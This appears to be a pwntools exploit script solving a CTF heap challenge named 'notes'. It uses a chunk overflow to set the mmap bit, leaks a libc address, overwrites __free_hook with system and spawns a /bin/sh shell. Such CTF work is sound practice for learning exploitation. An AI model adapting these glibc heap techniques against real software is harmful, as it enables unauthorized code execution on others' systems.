"""
Author:         Tom Hatskevich
Category:       pwn, heap exploitation
Challenge:      notes
Vulnerability:  'write note' function have hardcoded user input length, allocated chunk
                size under user control.
                If you specify title size msaller than 32, you will be able to overflow
                outside the current chunk memory.
Exploit:
    info leak:  calloc will not initialize (with nulls) chunks with mmap bit set.
                You can overflow into next chunk's size and set the mmap bit, than it will be allocated
                with uninitialized memory.
                You can allocate small-bin chunk size, free it and send to small-bin, set the mmap bit, 
                and allocate it back with libc pointers.
    write-what-where:   prepare fake note structure, set the mmap bit, allocate as note and edit the note's
                        fields (the pointers under your control from prevoius prepared fake chunk).
"""

from pwn import *
import struct

# ---------- FUNCTIONS ----------
def create():
    p.recv()
    p.sendline('1')
    p.recvline();p.recvline();p.recvline();p.recvline()
    

def write(index, title_length, content_length, title, content):
    p.recv()
    p.sendline('2')
    p.recv()
    p.sendline(str(index))
    p.recv()
    p.sendline(str(title_length))
    p.recv()
    p.sendline(str(content_length))
    p.recv()
    p.sendline(title)
    p.recv()
    p.sendline(content)
    p.recvline()

def edit(index, title=None, content=None):
    p.recv()
    p.sendline('3')
    p.recv()
    p.sendline(str(index))
    p.recv()
    if title:
        p.sendline(title)
        p.recvline()
    if content:
        p.sendline(content)
        p.recvline()
    
def read(index):
    p.recv()
    p.sendline('4')
    p.recv()
    p.sendline(str(index))
    title, content = p.recvline(), p.recvline()
    p.recvline()
    return title, content
    
def delete(index):
    #p.recv()
    p.sendline('5')
    p.recv()
    p.sendline(str(index))
    p.recvline()


# ---------- MAIN EXPLOIT ---------

LEAK_OFFSET = 0x1ebce0
__FREE_HOOK_OFFSET = 0x1eeb28
SYSTEM_OFFSET = 0x55410


p = remote('127.0.0.1', 12345)
#p = process('./notes')
#gdb.attach(p)


# fill tcache size 250
for i in range(7):
    create()
    write(0, 16, 250, 'X'*10, 'Z'*240)
    delete(0)    
# fill tcache size 350
for i in range(7):
    create()
    write(0, 16, 350, 'X'*10, 'Z'*240)
    delete(0) 

# clean fastbin
create()
write(0, 16, 350, 'X'*10, 'Z'*240)

#################### INFO LEAK ####################

# prepare reserve notes
create()    # 1
create()    # 2
create()    # 3
create()    # 4

# prepare heap layout to overflow metadata of the next chunk
write(1, 16, 350, 'A'*10, 'B'*240)
write(2, 16, 250, 'C'*10, 'D'*240)
delete(2)
delete(1)

# 1.    send chunks from unsorted-bin to small-bin
# 2.    overflow into next chunk and set the mmap bit
write(3, 16, 1000, 'X'*24 + p16(0x113), 'A'*100)

# allocate the chunk with the mmap bit (leads to uninitialized memory chunk)
# that that contains libc addresses.
write(4, 250, 16, '', '')

t, c = read(4)
leak = t[8:16]
leak = struct.unpack("<Q", leak)[0]
print("leak address = " + hex(leak))
libc_base = leak - LEAK_OFFSET
print("libc base = " + hex(libc_base))

################### WRITE WHAT WHERE ##################

# clean tcache
create()    # 1
write(1, 40, 350, 'A'*10, 'B'*240)

# prepare reserve notes
create()    # 2
create()    # 5
create()    # 6
create()    # 7
create()    # 8
create()    # 9

# prepare heap layout
write(2, 40, 16, 'V'*15, 'L'*15)
# prepare fast bin - remove non-relevant chunk
create()
# 
delete(2)
# prepare fast bin - remove non-relevant chunk
create()
# prepare fake note structure with pointer to overwrite
target = p64(libc_base + __FREE_HOOK_OFFSET)
length = p64(0x11223344)
write(5, 40, 100, 'A'*16 + target + length, '0'*40)
# send prepared chunks to fastbin
delete(5)
# prepare fast bin - remove non-relevant chunk
create()
# overflow into next chunk and set the mmap bit
write(6, 16, 100, 'X'*24 + p8(0x33), 'A'*8)
# prepare fast bin - remove non-relevant chunk
create()    # 11

# write-what-where: write system address into __free_hook pointer
edit(11, None, p64(libc_base + SYSTEM_OFFSET))

# create new note with atguments to system
create()    # 12
write(12, 100, 100, "/bin/sh", "/bin/sh")
# trigger system("/bin/sh") by calling free() function
delete(12)



p.recv()
print('-'*20 + " SHELL " + '-'*20)
p.interactive()